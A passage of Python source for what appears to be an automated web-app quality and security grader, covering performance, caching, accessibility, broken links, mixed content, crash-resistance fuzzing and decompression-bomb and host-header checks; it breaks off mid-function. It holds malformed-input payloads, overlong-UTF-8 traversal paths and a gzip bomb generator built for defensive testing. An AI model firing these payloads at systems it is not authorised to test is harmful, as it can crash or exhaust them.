    ctx.evidence.update(weight_bytes=weight, threshold_bytes=thresh,
                        tier=probe.probe.get("tier", "profile"))
    return weight >= thresh


def perf_request_count(ctx, probe) -> bool:
    """The homepage needs more than the profile's round-trip budget to render (too chatty)."""
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
        reqs = _page_weight(c, ctx.base_url, probe.probe.get("target", "/"))[1]
    ctx.evidence.update(requests=reqs, threshold=perf.REQUESTS_PROFILE)
    return reqs > perf.REQUESTS_PROFILE


def perf_load_time(ctx, probe) -> bool:
    """Computed end-to-end load time on the published profile crosses the absolute abandonment ceiling
    (~5s) -> most users leave. Deterministic: TTFB + weight/bandwidth + round-trips."""
    target = probe.probe.get("target", "/")
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
        ttfb = perf.sample_ttfb(c, target, n=3)
        weight, reqs = _page_weight(c, ctx.base_url, target)
    load_time = perf.computed_load_time(ttfb, weight, reqs)
    ctx.evidence.update(load_time_s=round(load_time, 2), ttfb_s=round(ttfb, 3), weight_bytes=weight,
                        requests=reqs, ceiling_s=perf.LOADTIME_CEILING)
    return load_time >= perf.LOADTIME_CEILING


# Caching — a static asset (JS/CSS/image/font) that carries no cache validators forces a full refetch
# on every page load; a validator the server won't honor with a 304 is decorative. Static assets only:
# HTML documents legitimately go uncached, so checking them would false-fire.
_STATIC_EXT = (".js", ".mjs", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
               ".webp", ".avif", ".woff", ".woff2", ".ttf", ".eot", ".otf", ".mp4", ".webm")
_STATIC_CTYPE = ("javascript", "css", "image/", "font/", "application/font", "svg")


def _static_assets(c, base_url, path="/"):
    """Same-origin static-asset paths (by extension) referenced by the homepage's src/href attrs."""
    try:
        r = c.get(path)
    except (httpx.HTTPError, httpx.InvalidURL):
        return []
    if "html" not in r.headers.get("content-type", "").lower():
        return []                                   # a JSON/asset homepage references no page assets
    base = urllib.parse.urlparse(base_url)
    out = []
    for ref in _ASSET_REF.findall(r.text):
        ref = ref.split("#")[0].strip()
        if not ref or ref.startswith(("data:", "javascript:", "mailto:", "tel:")):
            continue
        t = urllib.parse.urlparse(urllib.parse.urljoin("%s://%s%s" % (base.scheme, base.netloc, path), ref))
        if t.netloc != base.netloc or not t.path.lower().endswith(_STATIC_EXT):
            continue
        out.append(t.path + ("?" + t.query if t.query else ""))
    return list(dict.fromkeys(out))


def caching_ineffective(ctx, probe) -> bool | None:
    """Fetch each same-origin static asset and check it is actually cacheable: it must carry a validator
    (ETag / Last-Modified) or explicit freshness (Cache-Control max-age / Expires), must not say
    no-store, and any validator it advertises must yield a 304 on revalidation (else it's decorative and
    saves nothing). Fires on the first asset that fails. N/A when the page references no static asset."""
    budget = probe.probe.get("max_attempts", 20)
    tested = False
    n_assets = 0
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
        for path in _static_assets(c, ctx.base_url, probe.probe.get("target", "/")):
            if budget <= 0:
                break
            budget -= 1
            try:
                r = c.get(path)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            ctype = r.headers.get("content-type", "").lower()
            if r.status_code != 200 or not any(t in ctype for t in _STATIC_CTYPE):
                continue                            # 404/redirect or an SPA catch-all HTML shell -> not an asset
            tested = True
            n_assets += 1
            cc = r.headers.get("cache-control", "").lower()
            etag, lastmod = r.headers.get("etag", ""), r.headers.get("last-modified", "")
            has_fresh = any(k in cc for k in ("max-age", "public", "immutable")) or "expires" in r.headers
            if "no-store" in cc:
                ctx.evidence.update(cacheable=False, asset=path, issue="no-store")
                return True                         # actively un-cacheable -> refetched every load
            if not (etag or lastmod or has_fresh):
                ctx.evidence.update(cacheable=False, asset=path, issue="no-validator")
                return True                         # no caching affordance at all
            try:                                    # decorative validator: advertised but not honored
                if etag and c.get(path, headers={"If-None-Match": etag}).status_code != 304:
                    ctx.evidence.update(cacheable=False, asset=path, issue="etag-not-honored")
                    return True
                if not etag and lastmod and \
                        c.get(path, headers={"If-Modified-Since": lastmod}).status_code != 304:
                    ctx.evidence.update(cacheable=False, asset=path, issue="last-modified-not-honored")
                    return True
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
    if tested:
        ctx.evidence.update(cacheable=True, assets_checked=n_assets)
    return False if tested else None


_SOFT404_EXT = (".js", ".css", ".png", ".webp", ".svg", ".woff2")


def http_soft_404(ctx, probe) -> bool:
    """A missing STATIC ASSET must return a 4xx (normally 404), never 2xx. A 2xx for a guaranteed-
    nonexistent typed asset is a soft-404: a misconfigured catch-all (often an SPA serving index.html
    for everything) that makes caches, crawlers and monitors treat a nonexistent URL as real content.
    Using a *typed asset* path keeps this SPA-safe — the standard `/route -> 200 index` rewrite is
    intended, but no correct server (SPA or not) serves a nonexistent .js/.css/.png as success.
    Redirects are NOT followed: a 3xx to a login is an auth gate, not a soft-404."""
    token = "hlnope" + secrets.token_hex(5)          # a unique random name that cannot be a real file
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=False) as c:
        for ext in _SOFT404_EXT:
            try:
                r = c.get("/%s%s" % (token, ext))
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if 200 <= r.status_code < 300:
                ctx.evidence.update(soft_404=True, ext=ext, status=r.status_code)
                return True                          # nonexistent asset served as success -> soft-404
    ctx.evidence.update(soft_404=False, exts_tested=len(_SOFT404_EXT))
    return False


# Accessibility hard-fails — the OBJECTIVE, pass/fail subset of WCAG (an accessible name / lang / title /
# alt is present, and the contrast-ratio MATH), all readable from static HTML with no browser. Not the
# judgment calls (is the alt text meaningful, is the tab order sane) — only the unambiguous fails. All
# collapse to ONE "the page has accessibility hard-fails" finding (variant-grouped with the browser probe).
_A11Y_NAMED_ATTR = ("aria-label", "aria-labelledby", "title")
_LABELABLE = re.compile(r"<(input|select|textarea)\b([^>]*)>", re.IGNORECASE)
_SKIP_INPUT_TYPES = ("hidden", "submit", "button", "image", "reset")
_NAMED_COLORS = {"black": (0, 0, 0), "white": (255, 255, 255), "red": (255, 0, 0), "lime": (0, 255, 0),
                 "green": (0, 128, 0), "blue": (0, 0, 255), "gray": (128, 128, 128), "grey": (128, 128, 128),
                 "silver": (192, 192, 192), "yellow": (255, 255, 0), "navy": (0, 0, 128), "maroon": (128, 0, 0)}


def _tag_attr(name, tag):
    return re.search(r"\b" + name + r"""\s*=\s*["']?([^"'>\s]+)""", tag, re.IGNORECASE)


def _parse_color(s):
    s = s.strip().lower()
    m = re.match(r"rgba?\(\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)", s)
    if m:
        return int(m.group(1)), int(m.group(2)), int(m.group(3))
    tok = s.split()[0] if s.split() else ""
    if tok in _NAMED_COLORS:
        return _NAMED_COLORS[tok]
    m = re.match(r"#([0-9a-f]{3}|[0-9a-f]{6})\b", tok)
    if m:
        h = m.group(1)
        if len(h) == 3:
            h = "".join(ch * 2 for ch in h)
        return int(h[0:2], 16), int(h[2:4], 16), int(h[4:6], 16)
    return None


def _contrast_ratio(fg, bg):
    def _lin(rgb):
        def chan(c):
            c /= 255.0
            return c / 12.92 if c <= 0.03928 else ((c + 0.055) / 1.055) ** 2.4
        return 0.2126 * chan(rgb[0]) + 0.7152 * chan(rgb[1]) + 0.0722 * chan(rgb[2])
    l1, l2 = _lin(fg), _lin(bg)
    return (max(l1, l2) + 0.05) / (min(l1, l2) + 0.05)   # WCAG 2.x contrast ratio


def a11y_hard_fails(ctx, probe) -> bool | None:
    """Parse the homepage HTML for objective WCAG hard-fails with no browser: <html> without lang
    (3.1.1), <img> without alt (1.1.1), a form control with no accessible name (4.1.2/3.3.2), a
    missing/empty <title> (2.4.2), and inline-styled text below the universal 3:1 contrast floor (1.4.3,
    the ratio math). Each DISTINCT hard-fail contributes its severity tier to a SUM (see _a11y_penalty /
    _STATIC_A11Y_IMPACT), matching the browser axe probe's model so a multi-barrier page outscores a
    single-barrier one and the score doesn't jump when the browser is on vs off. N/A on a non-HTML page."""
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
        try:
            r = c.get(probe.probe.get("target", "/"))
        except (httpx.HTTPError, httpx.InvalidURL):
            return None
    if "html" not in r.headers.get("content-type", "").lower():
        return None
    doc = r.text
    fails: list[str] = []                                         # every distinct barrier, not the first
    m = re.search(r"<html\b([^>]*)>", doc, re.IGNORECASE)          # 1. <html> missing lang
    if m and not re.search(r"\blang\s*=", m.group(1), re.IGNORECASE):
        fails.append("missing-lang")
    if any(not re.search(r"\balt\s*=", tag, re.IGNORECASE)        # 2. <img> missing alt
           for tag in re.findall(r"<img\b[^>]*>", doc, re.IGNORECASE)):
        fails.append("img-missing-alt")
    tm = re.search(r"<title\b[^>]*>(.*?)</title>", doc, re.IGNORECASE | re.DOTALL)  # 3. missing/empty <title>
    if not tm or not tm.group(1).strip():
        fails.append("missing-title")
    label_fors = set(re.findall(r"""<label\b[^>]*\bfor\s*=\s*["']?([^"'>\s]+)""", doc, re.IGNORECASE))
    label_spans = [(mm.start(), mm.end())                          # 4. control with no accessible name
                   for mm in re.finditer(r"<label\b.*?</label>", doc, re.IGNORECASE | re.DOTALL)]
    for mm in _LABELABLE.finditer(doc):
        attrs = mm.group(2)
        tt = _tag_attr("type", attrs)
        if mm.group(1).lower() == "input" and tt and tt.group(1).lower() in _SKIP_INPUT_TYPES:
            continue
        if any(re.search(r"\b" + a + r"\s*=", attrs, re.IGNORECASE) for a in _A11Y_NAMED_ATTR):
            continue
        idm = _tag_attr("id", attrs)
        if idm and idm.group(1) in label_fors:
            continue
        if any(s <= mm.start() < e for s, e in label_spans):
            continue
        fails.append("control-no-accessible-name")
        break                                                     # one unlabeled control -> the barrier exists
    for mm in re.finditer(r"""<([a-z0-9]+)\b[^>]*\bstyle\s*=\s*["']([^"']*)["'][^>]*>(.*?)</\1>""",
                          doc, re.IGNORECASE | re.DOTALL):         # 5. inline-style contrast < 3:1 floor
        style = mm.group(2)
        if not re.sub(r"<[^>]+>", "", mm.group(3)).strip():
            continue
        cm = re.search(r"(?<!-)\bcolor\s*:\s*([^;]+)", style, re.IGNORECASE)
        bm = re.search(r"background(?:-color)?\s*:\s*([^;]+)", style, re.IGNORECASE)
        if cm and bm:
            fg, bg = _parse_color(cm.group(1)), _parse_color(bm.group(1))
            if fg and bg and _contrast_ratio(fg, bg) < 3.0:
                fails.append("low-contrast")
                break
    if not fails:
        ctx.evidence.update(fails=[])   # all objective WCAG hard-fails passed
        return False
    impacts: dict[str, int] = {}
    for f in fails:
        lvl = _STATIC_A11Y_IMPACT.get(f, "serious")
        impacts[lvl] = impacts.get(lvl, 0) + 1
    ctx.evidence.update(fails=fails, impacts=impacts, penalty_override=_a11y_penalty(impacts))
    return True


# Broken links — an internal <a href> that leads to a 4xx is a dead end in the user's journey. Fire on
# 4xx only (a missing/forbidden destination); 5xx is a server error (crash-resistance's domain), and a
# followed redirect that lands on a real page is NOT broken.
_ANCHOR_HREF = re.compile(r"""<a\b[^>]*\bhref\s*=\s*["']([^"']+)["']""", re.IGNORECASE)


def broken_links(ctx, probe) -> bool | None:
    """Fetch each same-origin <a href> link on the homepage; fire if one lands on a 4xx dead end. N/A
    when the page has no internal links to follow."""
    budget = probe.probe.get("max_attempts", 40)
    target = probe.probe.get("target", "/")
    base = urllib.parse.urlparse(ctx.base_url)
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
        try:
            r = c.get(target)
        except (httpx.HTTPError, httpx.InvalidURL):
            return None
        if "html" not in r.headers.get("content-type", "").lower():
            return None
        links = []
        for href in _ANCHOR_HREF.findall(r.text):
            href = href.split("#")[0].strip()
            if not href or href.startswith(("mailto:", "tel:", "javascript:", "data:")):
                continue
            if re.search(r"log[-_]?out|sign[-_]?out", href, re.IGNORECASE):
                continue                                   # never GET a logout link (would drop the session)
            t = urllib.parse.urlparse(urllib.parse.urljoin("%s://%s%s" % (base.scheme, base.netloc, target), href))
            if t.netloc == base.netloc and t.path:
                links.append(t.path + ("?" + t.query if t.query else ""))
        links = [p for p in dict.fromkeys(links) if p != target]   # dedupe, drop the self-link
        if not links:
            return None
        for path in links[:budget]:
            try:
                st = c.get(path).status_code
                if 400 <= st < 500:
                    ctx.evidence.update(broken=True, link=path, status=st)
                    return True                            # dead link: an internal href leads to a 4xx
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
    ctx.evidence.update(broken=False, links_checked=len(links[:budget]))
    return False


# Mixed content — an HTTPS page that LOADS a subresource over plain http:// . A man-in-the-middle can
# read/tamper the cleartext resource (an http:// <script> lets them own the DOM), so browsers hard-block
# active mixed content -> the page breaks. Subresources only (<script>/<img>/<link rel=stylesheet>/...),
# never <a href> (that's a navigation the user chooses, not a resource the page loads).
def _http_subresources(html: str, page_url: str) -> list[str]:
    """URLs of subresources the page loads that resolve to an insecure http:// origin. Protocol-relative
    (//host) and relative refs inherit the page's https scheme -> not mixed; only absolute http:// is."""
    refs = [m.group(2) for m in re.finditer(
        r"<(script|img|iframe|embed|audio|video|source|track)\b[^>]*\bsrc\s*=\s*[\"']([^\"']+)[\"']", html, re.I)]
    refs += re.findall(r"<object\b[^>]*\bdata\s*=\s*[\"']([^\"']+)[\"']", html, re.I)
    for m in re.finditer(r"<link\b([^>]*)>", html, re.I):     # stylesheets/preload are loaded; canonical isn't
        rel = re.search(r"\brel\s*=\s*[\"']?([^\"'>\s]+)", m.group(1), re.I)
        href = re.search(r"\bhref\s*=\s*[\"']([^\"']+)[\"']", m.group(1), re.I)
        if href and rel and rel.group(1).lower() in ("stylesheet", "preload", "prefetch", "modulepreload"):
            refs.append(href.group(1))
    insecure = [urllib.parse.urljoin(page_url, r.strip()) for r in refs]
    return list(dict.fromkeys(u for u in insecure if urllib.parse.urlparse(u).scheme == "http"))


def mixed_content(ctx, probe) -> bool | None:
    """On an HTTPS page, any subresource loaded over plain http:// is mixed content. N/A when the page
    itself isn't served over https (nothing can be 'mixed'). verify=False: a black-box grader connects to
    whatever cert the target presents (cert validity is a separate concern)."""
    if urllib.parse.urlparse(ctx.base_url).scheme != "https":
        return None
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:  # verify=False by default
        try:
            r = c.get(probe.probe.get("target", "/"))
        except (httpx.HTTPError, httpx.InvalidURL):
            return None
    if "html" not in r.headers.get("content-type", "").lower():
        return None
    insecure = _http_subresources(r.text, str(r.url))
    ctx.evidence.update(mixed=bool(insecure), http_subresources=insecure[:5])
    return True if insecure else False


# SEO / discoverability meta — objective presence checks on best-practice head tags. Viewport is the
# strong one (without it a mobile browser renders at desktop width -> tiny, unusable); description feeds
# the search snippet. Canonical is deliberately NOT checked: it's correctly absent on single-URL pages.
def seo_meta_missing(ctx, probe) -> bool | None:
    """Fire when the homepage lacks a viewport meta or a description meta. N/A on a non-HTML page."""
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
        try:
            r = c.get(probe.probe.get("target", "/"))
        except (httpx.HTTPError, httpx.InvalidURL):
            return None
    if "html" not in r.headers.get("content-type", "").lower():
        return None
    doc = r.text
    has_viewport = re.search(r"""<meta\b[^>]*\bname\s*=\s*["']?viewport\b""", doc, re.IGNORECASE)
    has_desc = re.search(r"""<meta\b[^>]*\bname\s*=\s*["']?description\b""", doc, re.IGNORECASE)
    ctx.evidence.update(viewport=bool(has_viewport), description=bool(has_desc))
    return not (has_viewport and has_desc)


# HTTP conformance — an HTML response served with no declared charset: the browser must GUESS the
# encoding (mojibake), and it's a UTF-7 XSS surface in old engines. (A "HEAD must not return a body"
# check was dropped: a spec-compliant HTTP client discards the HEAD body, so it isn't observable without
# raw-socket work — not worth it for this low-impact tail.)
def http_conformance(ctx, probe) -> bool | None:
    """Fire on an HTML response served without a declared charset. N/A on a non-HTML homepage."""
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
        try:
            r = c.get(probe.probe.get("target", "/"))
        except (httpx.HTTPError, httpx.InvalidURL):
            return None
    ctype = r.headers.get("content-type", "").lower()
    if "text/html" not in ctype:
        return None                                       # only HTML documents declare a page charset
    has_charset = "charset=" in ctype
    ctx.evidence.update(charset=has_charset)
    return not has_charset


# Crash-resistance — a ROBUST app rejects malformed input with a 4xx (400/413/422); a FRAGILE one lets
# it reach an unhandled exception -> 5xx. Comprehensive across malformed-input techniques, one finding.
# Precision: fire ONLY on 5xx (a 4xx IS graceful handling), and only when a BENIGN request to the same
# endpoint didn't 5xx (so the crash is attributable to the input, not a generally-broken endpoint).
_CRASH_VALUES = (
    "A" * 20_000,                          # oversized string
    "9" * 400,                             # oversized / overflow number
    "\x00\x01\x02\x03\x1f",                # null + control bytes
    "%s%n%x%p" * 25,                       # format-string specifiers
    "[" * 3000,                            # deeply nested / unbalanced brackets
    "﻿‮​\U0001f4a9",        # BOM + RTL-override + zero-width + astral emoji
    "-999999999999999999999999999",       # huge negative number
)
_CRASH_JSON = (
    b"{not valid json",                    # malformed syntax
    b"[" * 2000 + b"]" * 2000,             # deeply nested
    b'{"x": 1e999}',                       # out-of-range number
    b'{"x":"' + b"A" * 20_000 + b'"}',     # oversized value
    b'{"x": [1, 2, {"y":',                 # truncated
    b'{"x": "\\ud834"}',                   # lone-surrogate escape
)
_CRASH_PATHS = ("/%ff%fe", "/%c0%ae%c0%ae", "/%00", "/%e0%80%80")


def _induce_error_responses(ctx, budget=20):
    """Yield SERVER-ERROR responses (status >= 400) induced by malformed input on discovered forms/endpoints,
    plus the deliberate /crash route (the reference anchor + apps that ship one). Error-hygiene and debug-mode
    scan these BODIES for a leaked trace / debug UI — the induction crash-resistance does for STATUS, reused
    for CONTENT so those two probes fire on REAL apps, not only on a fixed /crash route. _endpoint_is_live-
    gated (a catch-all shell's error page isn't the app's), and only ERROR responses are yielded — a leak
    lives on an error, and 2xx content never carries a real trace, so this is the precision gate."""
    bad_val = _CRASH_VALUES[0]        # one oversized value -> induces an unhandled error on a brittle handler
    with make_client(ctx.base_url, ctx.headers, timeout=12.0, follow_redirects=False) as c:
        try:                          # the references' deliberate error route; a real app usually 404s here
            r = c.get("/crash")
            if r.status_code >= 400:
                yield r
        except (httpx.HTTPError, httpx.InvalidURL):
            pass
        forms = [(f.action, (f.method or "get").lower(), list(f.fields)) for f in ctx.profile.forms if f.fields]
        gets = [(e.raw_path, "get", list(e.query_params)) for e in ctx.profile.endpoints
                if e.method.lower() == "get" and e.query_params]
        for action, method, fields in forms + gets:
            if budget <= 0:
                break
            try:
                base = _xss_send(c, method, action, {fn: "1" for fn in fields})
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if base.status_code >= 500 or not _endpoint_is_live(ctx, c, action, method, base):
                continue              # already-5xx (env-var-dead) or a catch-all phantom -> unattributable
            budget -= 1
            try:
                r = _xss_send(c, method, action, {fn: bad_val for fn in fields})
                if r.status_code >= 400:
                    yield r
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
        posts = list(dict.fromkeys([f.action for f in ctx.profile.forms if (f.method or "").lower() == "post"]
                                   + [e.path for e in ctx.profile.endpoints if e.method.lower() == "post"]))
        for path in posts:
            if budget <= 0:
                break
            try:
                base = c.post(path, json={})
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if base.status_code >= 500 or not _endpoint_is_live(ctx, c, path, "post", base):
                continue
            budget -= 1
            try:
                r = c.post(path, content=_CRASH_JSON[0], headers={"Content-Type": "application/json"})
                if r.status_code >= 400:
                    yield r
            except (httpx.HTTPError, httpx.InvalidURL):
                continue


def leaks_error_detail(ctx, probe) -> bool | None:
    """Error-hygiene: an induced server error leaks a raw STACK TRACE or a DATABASE error to the user (info
    disclosure + a broken-error-path signal). Scans errors induced across discovered endpoints + /crash.
    Distinct from sec-debug (the full interactive DEBUG UI — strictly worse) and from SQLi (a leaked error on
    ANY error path, not proof of injectability). N/A when no error response could be induced."""
    inspected = False
    for r in _induce_error_responses(ctx):
        inspected = True
        if _TRACE.search(r.text):
            ctx.evidence.update(status=r.status_code, leak="stack-trace")
            return True
        if _SQL_ERROR.search(r.text):
            ctx.evidence.update(status=r.status_code, leak="db-error")
            return True
    ctx.evidence.update(inspected=inspected, leak=None)
    return False if inspected else None


_CONSTRAINT_VALUES = {
    "email": ("hl.probe@example.com", "hlnotanemail"),       # no @ -> unambiguously invalid
    "url": ("https://example.com/x", "hl not a url"),
    "date": ("2020-06-15", "hl-not-a-date"),
    "datetime-local": ("2020-06-15T10:00", "hl-not-a-date"),
    "time": ("10:30", "hl-not-a-time"),
    "month": ("2020-06", "hl-not-a-month"),
    "week": ("2020-W25", "hl-not-a-week"),
}


def _constraint_values(cons: dict):
    """(valid, invalid) pair for a declared field constraint, or None if not cleanly testable. The invalid
    value is UNAMBIGUOUSLY invalid (no @ in an email, letters in a number) so a server that accepts it is
    definitely not enforcing — this dodges the 'what counts as valid' fuzziness (a stricter-but-reasonable
    regex is not a bug)."""
    t = (cons.get("type") or "").lower()
    if t in ("number", "range"):
        return (str(cons.get("min") or "5"), "hlxyz")        # letters -> invalid for a number field
    return _CONSTRAINT_VALUES.get(t)


def _valid_for(cons: dict) -> str:
    """A value the field WILL accept: its declared-valid value, else a benign UNIQUE filler (fresh per call
    so a second submission never collides with the first on a unique field like username)."""
    v = _constraint_values(cons)
    return v[0] if v else "hl" + secrets.token_hex(3)


def _submission_accepted(resp, action: str) -> bool:
    """The server ACCEPTED the submission: a 2xx, or a 3xx redirect AWAY from the form (POST-redirect-GET
    success). A 4xx is a rejection; a 3xx back to the form action is an error re-show, also a rejection."""
    if 200 <= resp.status_code < 300:
        return True
    if 300 <= resp.status_code < 400:
        return action.rstrip("/") not in resp.headers.get("location", "")
    return False


def declared_constraint_unenforced(ctx, probe) -> bool | None:
    """The server accepts a value that violates the app's OWN declared field constraint (HTML5 type=email/
    number/url/date) — client-only validation, so garbage bypasses the browser straight into the app. The
    app's DECLARED type is the oracle (not our guess of intent), so this stays inside the wedge. Differential,
    other fields held valid: a VALID submission must be accepted first (baseline — else other fields/auth/CSRF
    are needed and it isn't attributable to this field), then the SAME submission with the one field set to an
    unambiguously-invalid value; if THAT is also accepted, the constraint isn't enforced. N/A when no declared-
    constrained form accepts a valid baseline."""
    tested = False
    with make_client(ctx.base_url, ctx.headers, timeout=12.0, follow_redirects=False) as c:
        for form in ctx.profile.forms:
            targets = [(f, form.constraints[f]) for f in form.fields
                       if f in form.constraints and _constraint_values(form.constraints[f])]
            method = (form.method or "post").lower()
            for field, cons in targets:
                valid_val, invalid_val = _constraint_values(cons)
                good = {f: _valid_for(form.constraints.get(f, {})) for f in form.fields}
                good[field] = valid_val
                try:
                    base = _xss_send(c, method, form.action, good)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if not _submission_accepted(base, form.action):
                    continue                                 # baseline rejected -> can't attribute to THIS field
                if not _endpoint_is_live(ctx, c, form.action, method, base):
                    continue                                 # catch-all phantom -> the 'acceptance' is the shell
                tested = True
                bad = {f: _valid_for(form.constraints.get(f, {})) for f in form.fields}
                bad[field] = invalid_val
                try:
                    r = _xss_send(c, method, form.action, bad)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if _submission_accepted(r, form.action):
                    ctx.evidence.update(action=form.action, field=field, declared=cons.get("type"),
                                        invalid=str(invalid_val)[:40], valid_status=base.status_code,
                                        invalid_status=r.status_code)
                    return True                              # accepted a value violating its own declared type
    ctx.evidence.update(tested=tested)
    return False if tested else None


def crash_resistance(ctx, probe) -> bool | None:
    """Fuzz discovered forms/params with malformed values, POST malformed JSON to POST endpoints, and
    request decode-crashing paths; fire if any yields a 5xx (an unhandled exception) rather than a
    graceful 4xx. N/A when there's no surface to exercise."""
    budget = probe.probe.get("max_attempts", 120)
    tested = False
    targets = ([(f.action, (f.method or "get").lower(), list(f.fields)) for f in ctx.profile.forms if f.fields]
               + [(e.raw_path, "get", list(e.query_params)) for e in ctx.profile.endpoints
                  if e.method.lower() == "get" and e.query_params])
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=False) as c:
        for action, method, fields in targets:            # 1. malformed field values
            try:
                base = _xss_send(c, method, action, {fn: "1" for fn in fields})
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if base.status_code >= 500:
                continue                                   # already 5xx on benign input -> unattributable
            if not _endpoint_is_live(ctx, c, action, method, base):
                continue                                   # catch-all phantom -> a 5xx here is a platform artifact
            for field in fields:
                for val in _CRASH_VALUES:
                    if budget <= 0:
                        break
                    budget -= 1
                    tested = True
                    data = {fn: (val if fn == field else "1") for fn in fields}
                    try:
                        st = _xss_send(c, method, action, data).status_code
                        if st >= 500:
                            ctx.evidence.update(crashed=True, via="malformed-field", target=action,
                                                field=field, payload=str(val)[:60], status=st)
                            return True                    # malformed input -> unhandled 5xx
                    except (httpx.HTTPError, httpx.InvalidURL):
                        continue
        posts = list(dict.fromkeys(                        # 2. malformed JSON to POST endpoints
            [f.action for f in ctx.profile.forms if (f.method or "").lower() == "post"]
            + [e.path for e in ctx.profile.endpoints if e.method.lower() == "post"]))
        for path in posts:
            try:                                           # baseline: a WELL-FORMED empty JSON body
                base = c.post(path, json={})
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if base.status_code >= 500:                    # already 5xx -> env-var-dead (dummy key), not OUR input
                continue
            if not _endpoint_is_live(ctx, c, path, "post", base):
                continue                                   # catch-all phantom -> a 5xx here is a platform artifact
            for body in _CRASH_JSON:
                if budget <= 0:
                    break
                budget -= 1
                tested = True
                try:
                    st = c.post(path, content=body, headers={"Content-Type": "application/json"}).status_code
                    if st >= 500:
                        ctx.evidence.update(crashed=True, via="malformed-json", target=path,
                                            payload=body[:60].decode("utf-8", "replace"), status=st)
                        return True
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
        for p in _CRASH_PATHS:                             # 3. decode-crashing paths (naive router -> 500)
            tested = True
            try:
                st = c.get(p).status_code
                if st >= 500:
                    ctx.evidence.update(crashed=True, via="decode-path", target=p, status=st)
                    return True
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
    if tested:
        ctx.evidence.update(crashed=False)
    return False if tested else None


_INGEST_PATHS = ("/ingest", "/upload", "/import", "/api/ingest", "/api/upload", "/api/import", "/webhook")


# Decompression-bomb (zip-bomb) resistance — an app that decompresses a `Content-Encoding: gzip` request
# body WITHOUT a decompressed-size cap can be memory-exhausted by a tiny payload that expands to GB. We
# detect the MISSING DEFENSE, never actually detonate: send a body that decompresses to ~50MB (safe on
# the sandbox, but above any sane cap) and check whether the app rejects it with 413 (capped) or
# processes it (uncapped). A 3-way differential first confirms the endpoint really decompresses request
# bodies, so a non-decompressing endpoint can't false-fire.
def decompression_bomb(ctx, probe) -> bool | None:
    """Fire when a POST endpoint decompresses gzip request bodies with no size cap (a zip bomb would
    exhaust memory). Confirms decompression via a differential; the probe payload is bounded (~50MB
    expanded) so it never nukes the target. N/A when no endpoint decompresses a request body."""
    # discovered POST endpoints (OpenAPI JSON APIs) + a few common body-ingesting paths a form crawl
    # won't surface (the decompression surface is usually an API, not an HTML form)
    posts = list(dict.fromkeys(
        [f.action for f in ctx.profile.forms if (f.method or "").lower() == "post"]
        + [e.path for e in ctx.profile.endpoints if e.method.lower() == "post"]
        + list(_INGEST_PATHS)))
    if not posts:
        return None
    valid = b'{"x":"ok"}'
    gz_valid = gzip.compress(valid)
    bomb = gzip.compress(b"\x00" * 50_000_000)   # ~50MB expanded, ~50KB on the wire
    json_ct = {"Content-Type": "application/json"}
    gz_ct = {"Content-Type": "application/json", "Content-Encoding": "gzip"}
    tested = False
    with make_client(ctx.base_url, ctx.headers, timeout=20.0) as c:
        for path in posts:
            try:                                       # 3-way: decompressed-valid != raw-gzip-bytes -> it decompresses
                ra = c.post(path, content=valid, headers=json_ct)                   # valid body, no encoding
                sa = ra.status_code
                sb = c.post(path, content=gz_valid, headers=json_ct).status_code    # gzip BYTES, no CE header
                sc = c.post(path, content=gz_valid, headers=gz_ct).status_code      # gzip body, CE: gzip
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if not (sc == sa and sc != sb):
                continue                               # endpoint doesn't decompress request bodies -> no bomb surface
            if not _endpoint_is_live(ctx, c, path, "post", ra):
                continue                               # a catch-all phantom endpoint -> the decompression is a
                                                       # platform-edge artifact, not the app's (the g-ai-sigma FP)
            tested = True
            try:
                r = c.post(path, content=bomb, headers=gz_ct)
            except httpx.TimeoutException:
                ctx.evidence.update(decompression_capped=False, endpoint=path, signal="timeout")
                return True                            # hung decompressing the bomb
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if r.status_code == 413:
                continue                               # rejected the over-limit decompressed body -> capped/defended
            ctx.evidence.update(decompression_capped=False, endpoint=path, status=r.status_code, expanded_mb=50)
            return True                                # decompresses (confirmed) with no size cap -> zip-bomb exhaustible
    ctx.evidence.update(decompression_capped=True, posts_tested=len(posts))
    return False if tested else None


# Host-header injection — the app trusts a client-controlled Host / X-Forwarded-Host and reflects it into
# an absolute URL or a redirect Location (web-cache poisoning, password-reset-link poisoning). Inject a
# unique marker host; fire if it comes back in a Location header or the body. A random marker can't
# reflect by coincidence -> near-zero false positives. Universally testable -> never N/A.
_HOST_HEADERS = ("Host", "X-Forwarded-Host")
# NOT the bare "/": a host reflected on the homepage is almost always the platform's canonical <link> /
# og:url echoing the requested host (near-universal on SPA/CDN hosts), a benign artifact, not the app's
# vuln. Host-header injection is dangerous where the app builds a link/redirect it hands the USER (a reset
# email, a login redirect), so target the reset/account/verify routes where reflection means poisoning.
_HOST_TARGETS = ("/account", "/reset", "/password-reset", "/forgot", "/login", "/verify", "/link")


def host_header_injection(ctx, probe) -> bool:
    """Inject a marker host via Host / X-Forwarded-Host across the homepage + likely reset/link routes;
